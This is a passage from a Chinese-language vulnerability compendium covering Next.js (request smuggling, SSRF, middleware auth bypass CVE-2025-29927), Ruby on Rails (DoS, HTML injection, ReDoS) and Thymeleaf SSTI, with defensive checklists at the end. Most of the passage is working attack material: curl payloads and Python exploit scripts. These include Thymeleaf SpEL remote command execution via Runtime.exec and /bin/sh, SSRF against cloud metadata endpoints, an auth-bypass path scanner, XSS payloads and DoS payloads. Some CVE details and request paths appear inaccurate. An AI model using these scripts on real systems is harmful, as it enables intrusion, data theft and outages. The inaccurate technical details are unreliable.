Next.js 在处理 HTTP 请求时，对 `Transfer-Encoding` 头和 `Content-Length` 头的解析存在歧义。当前端代理和后端 Next.js 服务器对请求边界的理解不一致时，攻击者可以构造恶意请求实现走私。

```
# 请求走私攻击示意
POST / HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 42
Transfer-Encoding: chunked

0

POST /admin HTTP/1.1
Host: target.com
```

前端代理按 `Transfer-Encoding: chunked` 解析（认为请求已结束），后端 Next.js 按 `Content-Length: 42` 解析（将第二部分视为新请求），从而实现请求走私。

**CVE-2024-34351 SSRF via SSR**：

Next.js 的 Server Actions 在处理跨域请求时存在缺陷。攻击者可以构造恶意的 Server Action 请求，使 Next.js 服务器向内网或其他受保护的服务发起请求，从而实现 SSRF。

```javascript
// 攻击者构造恶意 Server Action 请求
// Next.js 服务器会向指定的内部 URL 发起请求
// 这些内部 URL 通常无法从外部直接访问

// 攻击路径：
// 1. 构造包含内网地址的 Server Action 请求
// 2. Next.js 服务器发起 SSRF 到内网
// 3. 获取内网服务响应或进一步利用
```

#### HTTP PoC

```bash
# CVE-2024-34350: HTTP 请求走私
curl -X POST https://target.com \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 42" \
  -d "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"

# CVE-2024-34351: SSRF via Server Actions
curl -X POST https://target.com \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "1_=&_next_action=<action_id>&internal_url=http://169.254.169.254/latest/meta-data/"
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import argparse
import sys
import urllib3
import requests
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class NextJSExploit:
    def __init__(self, target, timeout=15):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False

    def test_request_smuggling(self):
        print("[*] CVE-2024-34350: HTTP 请求走私测试...")
        smuggled = (
            "0\r\n\r\n"
            "GET /admin HTTP/1.1\r\n"
            "Host: " + self.target.split("//")[1] + "\r\n"
            "X-Smuggled: true\r\n\r\n"
        )
        try:
            r = self.session.post(
                self.target,
                data=smuggled,
                headers={
                    "Transfer-Encoding": "chunked",
                    "Content-Type": "application/json"
                },
                timeout=self.timeout
            )
            if r.status_code in (200, 400, 502):
                print(f"  [*] 响应: HTTP {r.status_code}")
                print("  [*] 如出现 502 或 400 可能存在走私条件")
            else:
                print(f"  [-] HTTP {r.status_code}")
        except Exception as e:
            print(f"  [-] 测试失败: {e}")

    def test_ssrf(self, internal_url="http://169.254.169.254/latest/meta-data/"):
        print(f"[*] CVE-2024-34351: SSRF 测试 -> {internal_url}")
        try:
            r = self.session.get(
                urljoin(self.target, '/_next/data'),
                params={"url": internal_url},
                timeout=self.timeout
            )
            if r.status_code == 200 and ('ami-id' in r.text or 'instance-id' in r.text):
                print(f"[+] SSRF 成功! 获取到云元数据:\n{r.text[:500]}")
                return True
            print(f"[-] HTTP {r.status_code}")
        except Exception as e:
            print(f"[-] SSRF 测试失败: {e}")
        return False

    def full_check(self, internal_url="http://169.254.169.254/latest/meta-data/"):
        print(f"[*] 目标: {self.target}")
        self.test_request_smuggling()
        self.test_ssrf(internal_url)


def main():
    parser = argparse.ArgumentParser(
        description="Next.js SSRF & 请求走私 PoC (CVE-2024-34350 / CVE-2024-34351)"
    )
    parser.add_argument("-t", "--target", required=True, help="目标 URL")
    parser.add_argument("--internal-url",
                        default="http://169.254.169.254/latest/meta-data/",
                        help="SSRF 目标 URL")
    parser.add_argument("--timeout", type=int, default=15, help="超时")
    args = parser.parse_args()

    exploit = NextJSExploit(args.target, args.timeout)
    exploit.full_check(args.internal_url)


if __name__ == '__main__':
    main()
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2024-34351-nextjs-ssrf-ssr

info:
  name: Next.js SSRF via SSR (CVE-2024-34351)
  author: security-research
  severity: critical
  description: |
    Next.js < 14.1.1 的 Server Actions 存在 SSRF 漏洞，
    攻击者可构造恶意请求使服务器访问内网资源
  tags: nextjs,ssrf,ssr,cve-2024-34351
  reference:
    - https://nextjs.org/blog/security-nextjs-cve-2024-34351

http:
  - method: GET
    path:
      - "{{BaseURL}}/_next/data/build-id/en.json?url=http://127.0.0.1"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "ami-id"
          - "instance-id"
          - "EHOSTUNREACH"
        condition: or
      - type: status
        status:
          - 500
```

```yaml
id: cve-2024-34350-nextjs-request-smuggling

info:
  name: Next.js HTTP Request Smuggling (CVE-2024-34350)
  author: security-research
  severity: high
  description: |
    Next.js < 14.1.1 对 HTTP 请求边界解析存在歧义，
    可能导致 HTTP 请求走私
  tags: nextjs,smuggling,cve-2024-34350
  reference:
    - https://nextjs.org/blog/security-nextjs-cve-2024-34350

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "__next"
          - "next.js"
          - "nextjs"
        condition: or
      - type: status
        status:
          - 200
          - 301
          - 302
```

---

### 0x03.2 Next.js Middleware 认证绕过（CVE-2025-29927）

#### 漏洞背景

CVE-2025-29927（CVSS 9.1，CWE-288）是 Next.js 中一个极其严重的认证绕过漏洞。Next.js 的 Middleware 机制广泛用于实现全局认证、授权和请求拦截。该漏洞允许攻击者通过发送特殊构造的 HTTP 请求头，直接绕过 Middleware 中的所有安全检查，访问未授权的路由和资源。CISA 已将其列入 KEV 漏洞目录。

#### 受影响版本

| 组件 | 受影响版本 | 修复版本 |
|------|-----------|---------|
| Next.js Middleware | < 15.2.3 | 15.2.3 |

#### 漏洞原理分析

Next.js 在处理 HTTP 请求时，通过 `x-middleware-subrequest` 头标识内部子请求。当该请求头存在时，Next.js 会跳过 Middleware 执行——这是正常的内部机制。然而，攻击者可以在外部请求中伪造这个头，从而完全绕过 Middleware 中定义的所有认证和授权逻辑。

```javascript
// 应用中的 Middleware（认证检查）
// middleware.js
import { NextResponse } from 'next/server';

export function middleware(request) {
  const token = request.cookies.get('session-token');
  if (!token) {
    return NextResponse.redirect(new URL('/login', request.url));
  }
  return NextResponse.next();
}

export const config = {
  matcher: ['/dashboard/:path*', '/admin/:path*']
};

// 攻击者发送带 x-middleware-subrequest 头的请求
// Middleware 被完全跳过，无需任何认证即可访问 /admin
```

这个漏洞的核心问题在于：Next.js 将 `x-middleware-subrequest` 视为可信的内部标识，但这个请求头可以从外部完全可控。

#### HTTP PoC

```bash
# CVE-2025-29927: 绕过 Middleware 认证
curl -H "x-middleware-subrequest: _next/data" \
     https://target.com/admin/dashboard

# 访问受保护的 API 路由
curl -H "x-middleware-subrequest: _next/data" \
     https://target.com/api/admin/users

# 完整请求示例
curl -v \
  -H "x-middleware-subrequest: _next/data" \
  -H "Cookie: " \
  https://target.com/dashboard
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import argparse
import sys
import urllib3
import requests
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class NextJSAuthBypass:
    def __init__(self, target, timeout=15):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.bypass_headers = {
            "x-middleware-subrequest": "_next/data"
        }

    def test_bypass(self, path="/dashboard"):
        print(f"[*] CVE-2025-29927: Middleware 认证绕过测试...")
        url = urljoin(self.target, path)
        try:
            r_no_header = self.session.get(url, timeout=self.timeout)
            r_with_header = self.session.get(
                url, headers=self.bypass_headers, timeout=self.timeout
            )
            print(f"  无 bypass 头: HTTP {r_no_header.status_code}")
            print(f"  有 bypass 头: HTTP {r_with_header.status_code}")
            if (r_no_header.status_code in (301, 302, 401, 403) and
                    r_with_header.status_code == 200):
                print(f"  [+] 漏洞确认！Middleware 被成功绕过")
                return True
            elif r_no_header.status_code == r_with_header.status_code:
                print(f"  [-] 响应码相同，目标可能不受影响或路径不正确")
            else:
                print(f"  [*] 响应码不同，需手动验证")
        except Exception as e:
            print(f"  [-] 测试失败: {e}")
        return False

    def scan_paths(self, paths=None):
        if paths is None:
            paths = [
                "/dashboard", "/admin", "/admin/dashboard",
                "/settings", "/admin/users", "/api/admin",
                "/profile", "/account"
            ]
        print(f"[*] 批量路径绕过扫描 ({len(paths)} 个路径)...")
        results = []
        for path in paths:
            url = urljoin(self.target, path)
            try:
                r_normal = self.session.get(url, timeout=self.timeout)
                r_bypass = self.session.get(
                    url, headers=self.bypass_headers, timeout=self.timeout
                )
                status_normal = r_normal.status_code
                status_bypass = r_bypass.status_code
                vulnerable = (
                    status_normal in (301, 302, 401, 403) and
                    status_bypass == 200
                )
                marker = "[+]" if vulnerable else "[-]"
                print(f"  {marker} {path}: {status_normal} -> {status_bypass}")
                if vulnerable:
                    results.append(path)
            except Exception:
                print(f"  [-] {path}: 请求失败")
        return results


def main():
    parser = argparse.ArgumentParser(
        description="Next.js Middleware Auth Bypass PoC (CVE-2025-29927)"
    )
    parser.add_argument("-t", "--target", required=True, help="目标 URL")
    parser.add_argument("-p", "--path", default="/dashboard",
                        help="测试路径 (默认: /dashboard)")
    parser.add_argument("--scan", action="store_true",
                        help="扫描多个常见路径")
    parser.add_argument("--timeout", type=int, default=15, help="超时")
    args = parser.parse_args()

    exploit = NextJSAuthBypass(args.target, args.timeout)
    print(f"[*] 目标: {args.target}")

    if args.scan:
        results = exploit.scan_paths()
        if results:
            print(f"\n[+] 可绕过路径: {', '.join(results)}")
    else:
        exploit.test_bypass(args.path)


if __name__ == '__main__':
    main()
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2025-29927-nextjs-middleware-auth-bypass

info:
  name: Next.js Middleware Auth Bypass (CVE-2025-29927)
  author: security-research
  severity: critical
  description: |
    Next.js < 15.2.3 中攻击者可通过 x-middleware-subrequest
    请求头绕过 Middleware 认证逻辑
  tags: nextjs,auth-bypass,cve-2025-29927,middleware
  reference:
    - https://github.com/vercel/next.js/security/advisories/GHSA-4868-hrhg-2rhf

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "__next"
          - "_next/static"
        condition: or
      - type: status
        status:
          - 200

  - method: GET
    path:
      - "{{BaseURL}}/dashboard"
      - "{{BaseURL}}/admin"
      - "{{BaseURL}}/admin/dashboard"
    headers:
      x-middleware-subrequest: "_next/data"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        negative: true
        words:
          - "login"
          - "unauthorized"
          - "sign in"
        condition: or
```

---

## 0x04 Ruby on Rails 漏洞

### 0x04.1 Rails DoS 与 HTML 注入（CVE-2024-26143 / CVE-2024-26142 / CVE-2024-26144）

#### 漏洞背景

Ruby on Rails 是 Ruby 生态中最成熟的 Web 框架，广泛用于 SaaS 应用和 API 服务。2024 年 2 月，Rails 连续披露了三个影响 actionpack 和 actionview 组件的安全漏洞，覆盖 DoS、HTML 注入和 ReDoS 三种攻击类型。

#### 受影响版本

| CVE | 组件 | 受影响版本 | 修复版本 | CVSS |
|-----|------|-----------|---------|------|
| CVE-2024-26143 | actionpack | >= 7.0.0 | 7.0.8.1 / 7.1.3.1 | 7.5 |
| CVE-2024-26142 | actionview | 存在未转义输出 | 7.0.8.1 / 7.1.3.1 | 6.1 |
| CVE-2024-26144 | actionpack | 特定正则 | 7.0.8.1 / 7.1.3.1 | 5.3 |

#### 漏洞原理分析

**CVE-2024-26143 DoS**：

Rails 的 ActionPack 在路由匹配过程中，对特定格式的 URL 路径存在性能退化问题。当路由中包含大量嵌套参数时，路由匹配算法的复杂度从 O(n) 退化为 O(n²)，导致 CPU 资源耗尽。

**CVE-2024-26142 HTML 注入**：

ActionView 在渲染某些视图辅助方法时，未正确转义用户可控的内容。如果视图中使用了 `html_safe` 标记的字符串拼接，攻击者可以注入未转义的 HTML 标签。

```erb
<!-- 受影响的 Rails ERB 模板写法 -->
<div><%= user_input.html_safe %></div>

<!-- 或者在 helper 中的拼接 -->
<%= content_tag(:div, raw(params[:content])) %>
```

**CVE-2024-26144 ReDoS**：

ActionPack 的路由解析器中使用的正则表达式存在灾难性回溯问题。当路由定义中包含通配符和可选参数的组合时，构造特定的 URL 路径可以触发正则引擎的指数级回溯。

#### HTTP PoC

```bash
# CVE-2024-26143: DoS 攻击
curl "https://target.com/" -H "Accept: text/html" \
  --data-urlencode "path=$(python3 -c "print('/' + '/'.join(['a' * 200] * 50))")"

# CVE-2024-26142: HTML 注入
curl "https://target.com/search?q=<script>alert(1)</script>" \
  -H "Accept: text/html"

# CVE-2024-26144: ReDoS
curl "https://target.com/$(python3 -c "print('a' * 10000)")"
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import argparse
import sys
import time
import urllib3
import requests
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class RailsExploit:
    def __init__(self, target, timeout=30):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False

    def test_redos(self):
        print("[*] CVE-2024-26144: ReDoS 测试...")
        payload = "a" * 10000
        try:
            start = time.time()
            r = self.session.get(
                urljoin(self.target, f'/{payload}'),
                timeout=self.timeout
            )
            elapsed = time.time() - start
            print(f"  响应时间: {elapsed:.2f}s | HTTP {r.status_code}")
            if elapsed > 3:
                print("[+] 可能存在 ReDoS 漏洞")
                return True
        except requests.exceptions.Timeout:
            print("[+] 请求超时，可能存在 ReDoS 漏洞")
            return True
        except Exception as e:
            print(f"[-] 测试失败: {e}")
        return False

    def test_html_injection(self):
        print("[*] CVE-2024-26142: HTML 注入测试...")
        payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
        ]
        for payload in payloads:
            try:
                r = self.session.get(
                    urljoin(self.target, '/search'),
                    params={"q": payload},
                    timeout=self.timeout
                )
                if payload in r.text:
                    print(f"  [+] HTML 注入成功: {payload[:50]}")
                    return True
            except Exception:
                continue
        print("  [-] 未检测到 HTML 注入")
        return False

    def test_dos(self):
        print("[*] CVE-2024-26143: DoS 测试...")
        path = "/".join(["a" * 200 for _ in range(50)])
        try:
            start = time.time()
            r = self.session.get(
                urljoin(self.target, f'/{path}'),
                timeout=self.timeout
            )
            elapsed = time.time() - start
            print(f"  响应时间: {elapsed:.2f}s | HTTP {r.status_code}")
            if elapsed > 5:
                print("[+] 可能存在路由 DoS 漏洞")
                return True
        except requests.exceptions.Timeout:
            print("[+] 请求超时，可能存在 DoS 漏洞")
            return True
        except Exception as e:
            print(f"[-] 测试失败: {e}")
        return False

    def full_check(self):
        print(f"[*] 目标: {self.target}")
        self.test_redos()
        self.test_html_injection()
        self.test_dos()


def main():
    parser = argparse.ArgumentParser(
        description="Ruby on Rails 漏洞 PoC (CVE-2024-26143 / CVE-2024-26142 / CVE-2024-26144)"
    )
    parser.add_argument("-t", "--target", required=True, help="目标 URL")
    parser.add_argument("--cve", choices=["26143", "26142", "26144", "all"],
                        default="all", help="选择 CVE")
    parser.add_argument("--timeout", type=int, default=30, help="超时")
    args = parser.parse_args()

    exploit = RailsExploit(args.target, args.timeout)
    if args.cve == "26143":
        exploit.test_dos()
    elif args.cve == "26142":
        exploit.test_html_injection()
    elif args.cve == "26144":
        exploit.test_redos()
    else:
        exploit.full_check()


if __name__ == '__main__':
    main()
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2024-26144-rails-redos

info:
  name: Ruby on Rails ReDoS (CVE-2024-26144)
  author: security-research
  severity: medium
  description: |
    Rails actionpack 路由正则存在 ReDoS 漏洞
  tags: rails,redos,cve-2024-26144
  reference:
    - https://rubyonrails.org/2024/02/21/Rails-7-0-8-1-7-1-3-1-Released

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "csrf-token"
          - "csrf_meta_tags"
          - "rails"
        condition: or
      - type: status
        status:
          - 200
```

```yaml
id: cve-2024-26142-rails-html-injection

info:
  name: Ruby on Rails HTML Injection (CVE-2024-26142)
  author: security-research
  severity: medium
  description: |
    Rails actionview 未正确转义用户内容导致 HTML 注入
  tags: rails,xss,html-injection,cve-2024-26142
  reference:
    - https://rubyonrails.org/2024/02/21/Rails-7-0-8-1-7-1-3-1-Released

http:
  - method: GET
    path:
      - "{{BaseURL}}/?q=%3Cscript%3Ealert(1)%3C/script%3E"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<script>alert(1)</script>"
      - type: status
        status:
          - 200
```

---

## 0x05 Java 模板引擎漏洞

### 0x05.1 Thymeleaf SSTI（CVE-2024-22243 等）

#### 漏洞背景

Thymeleaf 是 Spring Boot 默认集成的 Java 模板引擎，广泛应用于企业级 Java Web 应用。Thymeleaf 的服务端模板注入（SSTI）是一类经典漏洞，攻击者通过操控视图名称（View Name）或模板参数，在服务端执行任意表达式（SpEL, Spring Expression Language），最终实现远程代码执行。

CVE-2024-22243（CVSS 8.1）以及相关 CVE 系列揭示了 Thymeleaf 在 Spring MVC 集成中的多个 SSTI 路径。当应用代码允许用户输入影响视图名称时，攻击者可以通过 `[[${...}]]` 表达式语法注入恶意 SpEL 表达式。

#### 受影响版本

| CVE | 组件 | 受影响版本 | 修复版本 |
|-----|------|-----------|---------|
| CVE-2024-22243 | Thymeleaf + Spring MVC | 特定配置下受影响 | 升级 Spring Framework |
| CVE-2022-22980 | Spring Data RCE (SpEL) | Spring Data Commons < 3.1.5 | 3.1.5+ |
| 相关系列 | Thymeleaf SSTI | 视图名可控的所有版本 | 应用层修复 |

#### 漏洞原理分析

Thymeleaf SSTI 的核心在于**视图名可控**。当应用代码将用户输入直接作为视图名称传给 Spring MVC 的 `ViewResolver` 时，Thymeleaf 会尝试解析该字符串中的表达式。

```java
// 受影响的 Controller 代码示例
@Controller
public class PageController {
    @GetMapping("/page")
    public String getPage(@RequestParam String name) {
        // 直接将用户输入作为视图名称 — 危险！
        return name;
    }
}

// 攻击者构造请求：
// GET /page?q=expression
// 当 name = "template" 时正常返回 template.html
// 当 name = "new org.springframework.context.expression.SpelExpressionParser().parseExpression('Runtime.getRuntime().exec(\"id\")').getValue()" 时触发 SSTI
```

Thymeleaf 在解析视图名时支持 `~{...}` 语法和 `[[${...}]]` 表达式。如果视图名中包含这些标记，Thymeleaf 会先求值表达式再渲染模板。

```java
// Thymeleaf 的表达式解析流程
// 1. ViewResolver 接收视图名
// 2. 如果包含 [[${...}]] 表达式，先进行求值
// 3. 求值时使用 Spring 的 SpEL 引擎
// 4. SpEL 引擎可执行任意 Java 代码

// 攻击 payload 示例：
// [[${T(java.lang.Runtime).getRuntime().exec('calc.exe')}]]
```

#### HTTP PoC

```bash
# Thymeleaf SSTI: 通过视图名注入 SpEL 表达式
curl "https://target.com/page?q=template" \
  # 正常请求，返回 template.html

# SSTI 利用 payload
curl "https://target.com/page?q=%5B%5B%24%7BT(java.lang.Runtime).getRuntime().exec(%27id%27)%7D%5D%5D"

# 或者通过 fragment 表达式
curl "https://target.com/page?q=~{::fragment[__${T(java.lang.Runtime).getRuntime().exec('id')}__]}"
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import argparse
import sys
import urllib3
import requests
from urllib.parse import urljoin, quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class ThymeleafSSTIExploit:
    def __init__(self, target, timeout=15):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False

    def test_ssti(self, endpoint="/page", param="q"):
        print("[*] Thymeleaf SSTI 探测...")
        probes = [
            "{{7*7}}",
            "${7*7}",
            "[[${7*7}]]",
            "~{#{test}}",
            "__${7*7}__",
        ]
        for probe in probes:
            try:
                r = self.session.get(
                    urljoin(self.target, endpoint),
                    params={param: probe},
                    timeout=self.timeout
                )
                if '49' in r.text:
                    print(f"  [+] SSTI 确认! Probe: {probe} -> 49")
                    return True
                print(f"  [-] Probe: {probe} -> HTTP {r.status_code}")
            except Exception:
                continue
        print("  [-] 未检测到 SSTI")
        return False

    def exploit_rce(self, command="id", endpoint="/page", param="q"):
        print(f"[*] Thymeleaf SSTI RCE: {command}")
        spel_payload = (
            "[[${T(java.lang.Runtime).getRuntime()."
            f"exec('{command}')}]]"
        )
        try:
            r = self.session.get(
                urljoin(self.target, endpoint),
                params={param: spel_payload},
                timeout=self.timeout
            )
            print(f"[*] HTTP {r.status_code}")
            if r.status_code == 200:
                print(f"[*] 响应: {r.text[:500]}")
            return r
        except Exception as e:
            print(f"[-] 利用失败: {e}")
        return None

    def exploit_with_process_builder(self, command="id",
                                     endpoint="/page", param="q"):
        spel_payload = (
            "[[${new java.util.Scanner("
            "T(java.lang.Runtime).getRuntime()"
            f".exec(new String[]{{'/bin/sh','-c','{command}'}})"
            ".getInputStream()).useDelimiter('\\\\A').next()}]]"
        )
        try:
            r = self.session.get(
                urljoin(self.target, endpoint),
                params={param: spel_payload},
                timeout=self.timeout
            )
            if r.status_code == 200:
                print(f"[+] 命令输出:\n{r.text[:1000]}")
                return r.text
        except Exception as e:
            print(f"[-] 利用失败: {e}")
        return None


def main():
    parser = argparse.ArgumentParser(
        description="Thymeleaf SSTI PoC (CVE-2024-22243 等)"
    )
    parser.add_argument("-t", "--target", required=True, help="目标 URL")
    parser.add_argument("-c", "--command", default="id", help="命令 (默认: id)")
    parser.add_argument("--endpoint", default="/page", help="端点 (默认: /page)")
    parser.add_argument("--param", default="q", help="参数名 (默认: q)")
    parser.add_argument("--timeout", type=int, default=15, help="超时")
    args = parser.parse_args()

    exploit = ThymeleafSSTIExploit(args.target, args.timeout)
    print(f"[*] 目标: {args.target}")

    if exploit.test_ssti(args.endpoint, args.param):
        exploit.exploit_rce(args.command, args.endpoint, args.param)
    else:
        print("[*] 标准探测未确认，尝试直接 RCE...")
        exploit.exploit_with_process_builder(
            args.command, args.endpoint, args.param
        )


if __name__ == '__main__':
    main()
```

#### Nuclei YAML 检测模板

```yaml
id: thymeleaf-ssti-detect

info:
  name: Thymeleaf SSTI Detection
  author: security-research
  severity: high
  description: |
    检测 Thymeleaf 模板引擎是否存在 SSTI 漏洞
    当视图名可控时，攻击者可注入 SpEL 表达式实现 RCE
  tags: thymeleaf,ssti,spel,spring,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}/?q=%7B%7B7*7%7D%7D"
      - "{{BaseURL}}/?q=%24%7B7*7%7D"
      - "{{BaseURL}}/?q=%5B%5B%24%7B7*7%7D%5D%5D"
    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "49"
          - "7049"
        condition: or
      - type: word
        words:
          - "SpelEvaluationException"
          - "TemplateProcessingException"
        condition: or
      - type: word
        words:
          - "Thymeleaf"
          - "th:"
        condition: or
```

---

## 0x06 公开 PoC 收集情况与利用思路

### PoC 收集情况总表

| CVE | GitHub PoC | Exploit-DB | Nuclei | 在野利用 |
|-----|-----------|------------|--------|----------|
| CVE-2024-56326 (Jinja2) | ✅ pallets/jinja GHSA | ⚠️ 研究者博客 | ✅ 社区模板 | ⚠️ 有限 |
| CVE-2024-56201 (Jinja2) | ✅ pallets/jinja GHSA | ❌ | ✅ 社区模板 | ⚠️ 有限 |
| CVE-2024-22195 (Jinja2) | ✅ pallets/jinja GHSA | ❌ | ✅ 社区模板 | ❌ |
| CVE-2024-24680 (Django) | ✅ django/django GHSA | ❌ | ⚠️ 通用 | ❌ |
| CVE-2024-27351 (Django) | ✅ django/django GHSA | ❌ | ⚠️ 通用 | ❌ |
| CVE-2024-38875 (Django) | ✅ django/django GHSA | ❌ | ❌ | ❌ |
| CVE-2021-3129 (Laravel) | ✅ ambionics.io/exploit | ✅ EDB-50093 | ✅ nuclei-templates | ✅ 大规模利用 |
| CVE-2024-50340 (Laravel) | ✅ GitHub security | ❌ | ⚠️ 通用 | ⚠️ 有限 |
| CVE-2024-13918 (Laravel) | ✅ laravel/framework | ❌ | ⚠️ 通用 | ❌ |
| CVE-2024-34350 (Next.js) | ✅ vercel/next.js | ❌ | ✅ 社区模板 | ⚠️ 有限 |
| CVE-2024-34351 (Next.js) | ✅ vercel/next.js | ❌ | ✅ 社区模板 | ⚠️ 有限 |
| CVE-2025-29927 (Next.js) | ✅ vercel/next.js | ✅ 远程利用工具 | ✅ nuclei-templates | ✅ CISA KEV |
| CVE-2024-26143 (Rails) | ✅ rails/rails GHSA | ❌ | ⚠️ 通用 | ❌ |
| CVE-2024-26142 (Rails) | ✅ rails/rails GHSA | ❌ | ⚠️ 通用 | ❌ |
| CVE-2024-26144 (Rails) | ✅ rails/rails GHSA | ❌ | ⚠️ 通用 | ❌ |
| Thymeleaf SSTI | ✅ 多个安全博客 | ✅ 多篇 | ✅ nuclei-templates | ✅ 广泛利用 |

### 关键 PoC 仓库链接

| 漏洞 | PoC 来源 | 链接 |
|------|---------|------|
| Jinja2 沙箱逃逸 | Pallets 官方安全公告 | `https://github.com/pallets/jinja/security/advisories` |
| Laravel Ignition RCE | Ambionics 研究 | `https://www.ambionics.io/blog/laravel-debug-rce` |
| Next.js 认证绕过 | Vercel 官方安全公告 | `https://github.com/vercel/next.js/security/advisories` |
| Django 安全公告 | Django 官方 | `https://www.djangoproject.com/weblog/` |
| Rails 安全公告 | Rails 官方 | `https://rubyonrails.org/blog/` |
| Thymeleaf SSTI | Pwnter 博客 | `https://www.pwntester.com/blog/2023/04/06/spring-web-thymeleaf-ssti/` |
| Nuclei 模板库 | ProjectDiscovery | `https://github.com/projectdiscovery/nuclei-templates` |
| Exploit-DB | OffSec | `https://www.exploit-db.com/` |

### 防守型验证思路

在安全评估中验证这些漏洞时，建议遵循以下原则：

1. **版本探测优先**：通过 HTTP 响应头、错误页面、`/package.json` 等路径确定框架和版本
2. **PoC 选择**：优先使用无害化的探测 payload（如 `7*7` 乘法运算），避免直接执行系统命令
3. **Nuclei 扫描**：使用 Nuclei 配合上述模板进行批量自动化检测
4. **日志审计**：在验证过程中密切监控目标系统的日志输出，确认是否存在异常行为
5. **报告归档**：将验证过程和结果整理为结构化报告，明确漏洞影响范围和修复建议

---

## 0x07 共性攻击模式分析

### 模式 1：模板注入（SSTI）→ RCE

模板注入是本专题中最常见的攻击模式，涉及 Jinja2、Thymeleaf 等多个模板引擎。攻击者通过将恶意表达式注入到模板中，利用模板引擎的表达式求值功能执行任意代码。

**攻击流程**：用户输入 → 模板渲染 → 表达式求值 → 代码执行

**关键利用链**：
- Jinja2：`{{ }}` 语法 → `__class__` → `__mro__` → `__subclasses__()` → `os._wrap_close` → `system()`
- Thymeleaf：视图名 → `[[${...}]]` 表达式 → SpEL 求值 → `Runtime.exec()`

### 模式 2：反序列化漏洞链

反序列化是 PHP 和 Java 生态中的经典攻击模式。Laravel 的 `unserialize()` 和 Python 的 `pickle.loads()` 都可能成为攻击入口。

**关键利用条件**：
- 存在可控的反序列化入口点
- 目标应用依赖链中存在可用的 gadget 类
- gadget chain 能够到达危险函数（`system`、`exec`、`eval` 等）

### 模式 3：沙箱逃逸技术

Jinja2 的沙箱环境是典型的"安全机制被绕过"案例。沙箱逃逸的核心思路是寻找未经沙箱拦截的隐式调用路径。

**常见逃逸路径**：
- `str.format` → `__format__`（CVE-2024-56326）
- `cycler.__init__.__globals__` 访问全局变量（CVE-2024-56201）
- Python 内置类的 `__subclasses__()` 枚举

### 模式 4：HTTP 请求走私与认证绕过

Next.js 的 CVE-2024-34350 和 CVE-2025-29927 展示了 HTTP 层面的两类攻击：
- **请求走私**：利用前后端对 HTTP 头解析的不一致性
- **认证绕过**：伪造内部标识头绕过 Middleware 检查

**核心教训**：永远不要信任来自客户端的"内部标识"请求头。

### 模式 5：正则表达式拒绝服务（ReDoS）

Django、Rails 等多个框架都因正则表达式的灾难性回溯问题被报告 DoS 漏洞。ReDoS 的影响虽然不如 RCE 直接，但在高并发场景下可导致服务完全不可用。

**防御要点**：避免在正则中使用嵌套量词（如 `(a+)+`），使用 ReDoS 检测工具扫描正则表达式。

---

## 0x08 应急排查与防守建议

### 紧急排查清单

| 排查项 | 检查方法 | 命令/工具 |
|--------|---------|-----------|
| Jinja2 版本 | pip show jinja2 | `pip show jinja2 \| grep Version` |
| Django 版本 | python -c "import django; print(django.VERSION)" | 直接执行 |
| Laravel 版本 | cat composer.json \| grep laravel/framework | `grep -i "laravel" composer.lock` |
| Next.js 版本 | cat package.json \| grep next | `npm ls next` |
| Rails 版本 | rails -v | `grep rails Gemfile.lock` |
| Thymeleaf 版本 | pom.xml 中 thymeleaf 版本 | `grep thymeleaf pom.xml` |
| 调试模式 | 检查 .env 中 APP_DEBUG | `grep APP_DEBUG .env` |
| Middleware 检查 | 检查 Next.js 版本和 middleware.js | `find . -name "middleware.js"` |

### 日志关键字段表

| 日志来源 | 关键字段 | 检索模式 |
|---------|---------|---------|
| Nginx access.log | 请求路径 + User-Agent | `grep -E "\{\{|\[\[|__class__|__mro__"` |
| Django log | 异常堆栈 | `grep -i "suspicious\|sqli\|ssti"` |
| Laravel storage/logs | Ignition 错误 | `grep "_ignition\|execute-solution"` |
| Next.js stdout | Middleware 警告 | `grep -i "middleware\|subrequest"` |
| Rails production.log | 500 错误 | `grep "500 Internal\|ActionController"` |

### 紧急缓解措施

1. **Jinja2**：升级至 3.1.6+，对所有用户输入进行严格过滤，禁用 `SandboxedEnvironment` 中的危险属性
2. **Django**：升级至 5.0.3+，对所有数值输入进行边界检查，启用 WAF 的 ReDoS 规则
3. **Laravel**：生产环境关闭 `APP_DEBUG`，升级 Ignition 至 2.5.2+，移除所有 `unserialize()` 调用或替换为 `json_decode()`
4. **Next.js**：升级至 15.2.3+，在反向代理层（Nginx）过滤 `x-middleware-subrequest` 头
5. **Rails**：升级至 7.1.3.1+，审查所有 `html_safe` 和 `raw` 的使用，使用 CSP 头防御 HTML 注入
